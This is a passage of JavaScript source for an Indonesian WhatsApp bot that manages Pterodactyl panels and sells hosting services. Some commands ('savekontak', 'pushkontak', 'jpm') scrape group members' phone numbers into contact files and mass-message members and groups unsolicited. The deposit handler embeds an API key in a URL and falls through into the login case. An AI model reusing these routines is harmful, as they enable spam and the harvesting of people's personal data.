  if (!isGroupAllowed(m.chat)) return m.reply('Grup ini belum diberi akses. Minta owner ketik *.addakses* di grup ini.');
  const page = m.quoted ? m.quoted.page : 1;
  const version = m.body.split(" ")[1] || "v1";
  let fetchUrl = `${domain}/api/application/servers?page=${page}`;
  let apiKey = apikey;
  let capiKey = capikey;
  switch(version) {
    case "v2":
      fetchUrl = `${domainV2}/api/v2/application/servers?page=${page}`;
      apiKey = apikeyV2;
      capiKey = capikeyV2;
      break;
    case "v3":
      fetchUrl = `${domainV3}/api/v3/application/servers?page=${page}`;
      apiKey = apikeyV3;
      capiKey = capikeyV3;
      break;
    case "v4":
      fetchUrl = `${domainV4}/api/v4/application/servers?page=${page}`;
      apiKey = apikeyV4;
      capiKey = capikeyV4;
      break;
    case "v5":
      fetchUrl = `${domainV5}/api/v5/application/servers?page=${page}`;
      apiKey = apikeyV5;
      capiKey = capikeyV5;
      break;
    default:
      break;
  }
  const fetchServers = async () => {
    const response = await fetch(fetchUrl, {
      method: "GET",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${apiKey}`,
      },
    });
    const data = await response.json();
    return data.data;
  };
  const servers = await fetchServers();
  if (servers.length < 1) return m.reply("Tidak Ada Server Bot");
  let messageText = `\n *乂 List Server Panel Pterodactyl (Version ${version})*\n`;
  const serverList = await Promise.all(servers.map(async (server, index) => {
    const s = server.attributes;
    const response = await fetch(`${domain}/api/client/servers/${s.uuid.split("-")[0]}/resources`, {
      method: "GET",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${capiKey}`,
      },
    });
    const data = await response.json();
    const status = data.attributes ? data.attributes.current_state : s.status;
    return `\n*${index + 1}. ID :* ${s.id}  *Nama :* ${s.name}  *Ram :* ${
      s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().slice(0, 2) + "GB" : s.limits.memory.toString().slice(0, 1) + "GB"
    }  *CPU :* ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}  *Disk :* ${
      s.limits.disk == 0 ? "Unlimited" : s.limits.disk.toString().length > 3 ? s.limits.disk.toString().slice(0, 2) + "GB" : s.limits.disk.toString().slice(0, 1) + "GB"
    }  *Created :* ${s.created_at.split("T")[0]}\n*Status:* ${status}\n`;
  }));
  messageText += serverList.join("");
  messageText += `\n\n*Halaman:* ${page} - Untuk melanjutkan ke halaman berikutnya, gunakan perintah \`${prefix}listpanel ${version} ${page + 1}\`.`;
  messageText += `\nJika ingin melihat halaman sebelumnya, gunakan \`${prefix}listpanel ${version} ${page - 1}\`.`;
  await conn.sendMessage(m.chat, { text: messageText }, { quoted: m });
} break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "deladmin":
case "deladminv1":
case "deladminv2":
case "deladminv3":
case "deladminv4":
case "deladminv5": {
  if (!isCreator) return Reply(mess.owner);
  let versi = command.replace("deladmin", "").trim() || "";
  if (!versi) {
    return m.reply(`*乂 INSTRUKSI HAPUS ADMIN PANEL*\n\nGunakan salah satu format berikut:\n\n` +
      `• *${prefix}deladminv1 [id]*\n• *${prefix}deladminv2 [id]*\n• *${prefix}deladminv3 [id]*\n` +
      `• *${prefix}deladminv4 [id]*\n• *${prefix}deladminv5 [id]*\n\nContoh: *${prefix}deladminv2 12*`);
  }
  let version = versi.startsWith("v") ? versi.slice(1) : versi;
  let idTarget = argsbiyuoffc[0];
  let token = (version === "5") ? capikey : apikey;
  const fetchAllAdmins = async () => {
    let allUsers = [];
    let currentPage = 1;
    let hasNextPage = true;
    while (hasNextPage) {
      let cek = await fetch(`${domain}/api/application/users${version !== "1" ? `/v${version}` : ""}?page=${currentPage}`, {
        method: "GET",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`
        }
      });
      let res = await cek.json();
      if (res.data && res.data.length > 0) {
        allUsers.push(...res.data);
        if (res.meta?.pagination?.current_page < res.meta?.pagination?.total_pages) {
          currentPage++;
        } else {
          hasNextPage = false;
        }
      } else {
        hasNextPage = false;
      }
    }
    return allUsers;
  };
  const allUsers = await fetchAllAdmins();
  if (!idTarget) {
    if (allUsers.length < 1) return m.reply("Tidak ada admin panel.");
    let teks = `*乂 Daftar Admin Panel Pterodactyl v${version.toUpperCase()}*\n\n`;
    allUsers.forEach((i) => {
      if (i.attributes.root_admin !== true) return;
      teks += `• *${i.attributes.first_name}* (ID: ${i.attributes.id})\n`;
    });
    teks += `\nGunakan perintah:\n*${prefix}deladminv${version} [id]*\nContoh: *${prefix}deladminv${version} 12*`;
    return m.reply(teks);
  }
  let targetUser = allUsers.find(e => e.attributes.id == idTarget && e.attributes.root_admin === true);
  if (!targetUser) return m.reply("Akun admin tidak ditemukan atau bukan root_admin!");
  let delusr = await fetch(`${domain}/api/application/users${version !== "1" ? `/v${version}` : ""}/${targetUser.attributes.id}`, {
    method: "DELETE",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: `Bearer ${token}`
    }
  });
  let res = delusr.ok ? { errors: null } : await delusr.json();
  if (res.errors) {
    return m.reply(`Gagal menghapus admin panel: ${JSON.stringify(res.errors)}`);
  }
  await m.reply(`Berhasil menghapus admin panel *${capital(targetUser.attributes.username)}* (ID ${targetUser.attributes.id}) dari v${version}`);
}
break
case "delpanel":
case "delpanelv1":
case "delpanelv2":
case "delpanelv3":
case "delpanelv4":
case "delpanelv5": {
  if (!isCreator && !isPremium) return Reply(mess.owner);
  if (!isGroupAllowed(m.chat)) return m.reply('Grup ini belum diberi akses. Minta owner ketik *.addakses* di grup ini.');
  let versi = command.replace("delpanel", "").trim() || "";
  if (!versi) {
    return m.reply(`*乂 INSTRUKSI HAPUS SERVER PANEL*\n\nGunakan salah satu format berikut:\n\n` +
      `• *${prefix}delpanelv1 [id]*\n• *${prefix}delpanelv2 [id]*\n• *${prefix}delpanelv3 [id]*\n` +
      `• *${prefix}delpanelv4 [id]*\n• *${prefix}delpanelv5 [id]*\n\nContoh: *${prefix}delpanelv2 9*`);
  }
  let headers = {
    "Accept": "application/json",
    "Content-Type": "application/json",
    "Authorization": `Bearer ${apikey}`
  };
  let res = await fetch(`${domain}/api/application/servers?page=1`, { method: "GET", headers });
  if (!res.ok) {
    let errtext = await res.text();
    return m.reply(`Gagal mengambil data server:\nStatus ${res.status}\nRespon: ${errtext.slice(0, 200)}...`);
  }
  let json = await res.json();
  let servers = json.data;
  if (!text) {
    if (!servers.length) return m.reply("Tidak ada server yang ditemukan.");
    let out = `*乂 Daftar Server Panel ${versi.toUpperCase()}*\n\n`;
    for (let srv of servers) {
      let s = srv.attributes;
      out += `• ID: *${s.id}*\n  Nama: ${s.name}\n  RAM: ${s.limits.memory}MB | Disk: ${s.limits.disk}MB | CPU: ${s.limits.cpu}%\n\n`;
    }
    out += `Gunakan perintah:\n*${prefix}delpanel${versi} [id]*\nContoh: *${prefix}delpanel${versi} ${servers[0]?.attributes.id || 1}*`;
    return m.reply(out);
  }
  let id = parseInt(text);
  let target = servers.find(s => s.attributes.id === id);
  if (!target) return m.reply("ID server tidak ditemukan.");
  let namaServer = target.attributes.name.toLowerCase();
  let namaTampil = target.attributes.name;
  await fetch(`${domain}/api/application/servers/${id}`, {
    method: "DELETE",
    headers
  });
  let userRes = await fetch(`${domain}/api/application/users?page=1`, { method: "GET", headers });
  if (!userRes.ok) {
    let errtext = await userRes.text();
    return m.reply(`Gagal mengambil data user:\nStatus ${userRes.status}\nRespon: ${errtext.slice(0, 200)}...`);
  }
  let userJson = await userRes.json();
  let users = userJson.data;
  let user = users.find(u => u.attributes.first_name?.toLowerCase() === namaServer);
  if (user) {
    await fetch(`${domain}/api/application/users/${user.attributes.id}`, {
      method: "DELETE",
      headers
    });
  }
  m.reply(`Server *${capital(namaTampil)}* berhasil dihapus dari versi ${versi.toUpperCase()}.`);
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "produk": case "listproduk": case "list": {
await conn.sendMessage(m.chat, {
  footer: `${botname}`,
  buttons: [{
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: `${prefix}buypanel`
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: `${prefix}buyadp`
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: `${prefix}buyvps`
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: `${prefix}buysc`
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: "Berikut adalah list produk\n"
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "savekontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("idgrupnya"))
let res = await conn.groupMetadata(text)
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer ${global.namaOwner}- ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await conn.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "savekontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let res = await m.metadata
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer ${global.namaOwner}- ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await conn.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pushkontak": {
  if (!isOwner) return Reply(mess.owner);
  if (!text) return m.reply(example("idgrup|pesannya"));

  const [idgc, pes] = text.split("|");
  if (!idgc || !pes) return m.reply(example("idgrup|pesannya"));

  const jidawal = m.chat;

  try {
    
    const data = await conn.groupMetadata(idgc);
    if (!data || !data.participants) {
      return m.reply("Gagal mendapatkan metadata grup. Pastikan ID grup valid.");
    }

    const halls = data.participants
      .filter(v => v.id.endsWith('.net'))
      .map(v => v.id);

    if (halls.length === 0) {
      return m.reply("Tidak ada anggota yang valid untuk dikirimi pesan.");
    }

    await m.reply(`Memproses *pushkontak* ke dalam grup *${data.subject}*`);

    for (let mem of halls) {
      if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
        const vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:${namaOwner}\nORG:Developer;\nTEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\nEND:VCARD`;

        try {
          const sentMsg = await conn.sendMessage(mem, { contacts: { displayName: namaOwner, contacts: [{ vcard }] } });
          await conn.sendMessage(mem, { text: pes }, { quoted: sentMsg });
        } catch (err) {
          console.log(`Gagal mengirim ke ${mem}:`, err);
        }

        await delay(global.delayPushkontak);
      }
    }

    await conn.sendMessage(jidawal, { text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}` }, { quoted: m });

  } catch (err) {
    console.log("Error:", err);
    return m.reply("Terjadi kesalahan dalam mendapatkan metadata grup atau mengirim pesan.");
  }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "respushkontak": {
if (!isOwner) return 
if (!text) return 
if (!global.textpushkontak) return
const idgc = text
const teks = global.textpushkontak
const jidawal = m.chat
const data = await conn.groupMetadata(idgc)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak* ke dalam grup *${data.subject}*`)

for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await conn.sendMessage(mem, {text: teks}, {quoted: qlocPush })
await sleep(global.delayPushkontak)
}}

delete global.textpushkontak
await conn.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pushkontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!text) return m.reply(example("pesannya"))
const teks = text
const jidawal = m.chat
const data = await conn.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses pushkontak ke *${halls.length}* member grup`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await conn.sendMessage(mem, {text: teks}, {quoted: qlocPush })
await sleep(global.delayPushkontak)
}}

await conn.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmslide": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await conn.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i)
count += 1
} catch {}
await sleep(global.delayJpm)
}
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmslidehidetag": case "jpmslideht": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await conn.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide hidetag* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i, allgrup[i].participants.map(e => e.id))
count += 1
} catch {}
await sleep(global.delayJpm)
}
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpm": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teksnya"))
let allgrup = await conn.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await m.reply(`Memproses *jpm* teks Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, {text: `${teks}`}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpm2": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await conn.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await conn.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* teks & foto Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, {image: await fs.readFileSync(rest), caption: teks, contextInfo: { isForwarded: true, mentionedJid: [m.sender], businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: global.namaSaluran, newsletterJid: global.idSaluran }}}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmtesti": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await conn.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await conn.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* testimoni Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, {
  footer: `${botname}`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: `${prefix}buypanel`
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: `${prefix}buyadp`
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: `${prefix}buyvps`
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: `${prefix}buysc`
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `\n${teks}\n`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }
  },
}, {quoted: qtoko})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

case "depo": case "deposit": {
if (m.isGroup) return m.reply("Pembelian hanya bisa dilakukan di private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")

let teks = `
*#- Masukkan nominal deposit yang ingin dilakukan*
Contoh penggunaan: *.depo* 5000
`
if (!text) return m.reply(teks)

let amount = Number(text)
if (isNaN(amount) || amount <= 0) return m.reply("Nominal yang dimasukkan tidak valid. Harap masukkan jumlah yang benar.")
const UrlQr = global.qrisOrderKuota
const adjustedAmount = amount + generateRandomNumber(110, 250)
const axios = require('axios');
const get = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/createpayment?apikey=new2025&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*▧ INFORMASI PEMBAYARAN*

*• ID :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Expired :* 5 menit

*Note :* 
QRIS pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`

let msgQr = await conn.sendMessage(m.chat, {
  footer: `${botname}`,
  buttons: [
    {
      buttonId: `${prefix}batalbeli`, 
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
transactionId: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000) 
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(15000)
const axios = require('axios');
const resultcek = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/cekstatus?apikey=new2025&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data.amount
if (db.users[m.sender].saweria && req == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

*• ID :* ${db.users[m.sender].saweria.transactionId}
*• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
*• Payment :* ${resultcek.data.brand_name}
`}, {quoted: db.users[m.sender].saweria.msg})
}
}
}
//-# Saweria Login
case 'login': {
    if (m.isGroup) return m.reply(mess.group)
    if (!isOwner) return Reply(mess.owner)
    let db_saweria = [];
    try {
        const data = fs.readFileSync("./source/saweria.json", 'utf8');
        db_saweria = JSON.parse(data);
        if (!Array.isArray(db_saweria)) {
            db_saweria = [];
        }
    } catch (error) {
        db_saweria = [];
    }
    if (db_saweria.length >= 1) {
        return m.reply(`Sudah login di saweria...`);
    }
    if (!q) return m.reply(`Contoh: ${prefix+command} password|email@gmail.com`);
    const parts = q.split('|');
    if (parts.length !== 2) return m.reply(`Contoh: ${prefix+command} password|email@gmail.com`);
    const password = parts[0].trim();
    const email = parts[1].trim();
    if (!email.includes('@') || !email.includes('.')) {
        return m.reply(`Format email tidak valid. Contoh: ${prefix+command} password|email@gmail.com`);
    }

    try {
        await m.reply("Sedang mencoba login...");
        let Pay = new Saweria(db_saweria);
        let res = await Pay.login(email, password);
        if (!res.status) {
            return m.reply(`Terjadi kesalahan saat login:\n${res.msg}`);
        }
        await sleep(500);
        await m.reply(`*LOGIN SUKSES ✅*\n\n*USER ID:* ${res.data.user_id}`);
        db_saweria.push(res.data.user_id);
        fs.writeFileSync("./source/saweria.json", JSON.stringify(db_saweria, null, 2), 'utf8');
    } catch (error) {
        console.error('Login error:', error);
        return m.reply('Terjadi kesalahan saat login. Silakan coba lagi.');
    }
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pay": case "payment": case "qris": {
await conn.sendMessage(m.chat, {
  footer: `${botname}`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Payment Lain',
          sections: [
            {
              title: 'List Payment',
              rows: [
                {
                  title: 'DANA',
                  id: `${prefix}dana`
                },
                {
                  title: 'OVO',
                  id: `${prefix}ovo`
                },                
                {
                  title: 'GOPAY',
                  id: `${prefix}gopay`
                },
                {
                  title: 'SHOPEEPAY',
                  id: `${prefix}shopepay`
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: global.image.qris}, 
  caption: "\n```Scan qris diatas dan jika sudah transfer mohon sertakan bukti transfer !!```\n"
}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "dana": {
if (!isCreator) return
let teks = `
*PAYMENT DANA ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.dana}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ovo": {
if (!isCreator) return
let teks = `
*PAYMENT OVO ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.ovo}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "gopay": {
if (!isCreator) return
let teks = `
*PAYMENT GOPAY ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.gopay}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "shopepay": {
if (!isCreator) return
let teks = `
*PAYMENT SHOPEPAY ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.shopepay}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ambilq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "toaudio": case "tovn": {
if (!/video|mp4/.test(mime)) return m.reply(example("dengan reply/kirim vidio"))
const vid = await conn.downloadAndSaveMediaMessage(qmsg)
const result = await toAudio(fs.readFileSync(vid), "mp4")
await conn.sendMessage(m.chat, { audio: result, mimetype: "audio/mpeg", ptt: /tovn/.test(command) ? true : false }, { quoted: m })
await fs.unlinkSync(vid)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "proses": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await conn.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Dana Masuk ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "done": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await conn.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Transaksi Done ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "developerbot": case "owner": {
await conn.sendContact(m.chat, [global.owner], m)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "save": case "sv": {
if (!isCreator) return
await conn.sendContact(m.chat, [m.chat.split("@")[0]], m)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "public": {
    if (!isCreator) return
    conn.public = true
    const dir = "./library/database";
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }
    const modeFilePath = require('path').resolve(dir, "mode.json");
    fs.writeFileSync(modeFilePath, JSON.stringify({ public: true }, null, 2), 'utf8');
    if (fs.existsSync(modeFilePath)) {
        console.log(`Mode saved successfully at ${modeFilePath}`);
        m.reply("Berhasil mengganti ke mode *public*");
    } else {
        m.reply("Gagal menyimpan mode!");
    }
}
break

case "self": {
    if (!isCreator) return
    conn.public = false
    const dir = "./library/database";
    if (!fs.existsSync(dir)) {
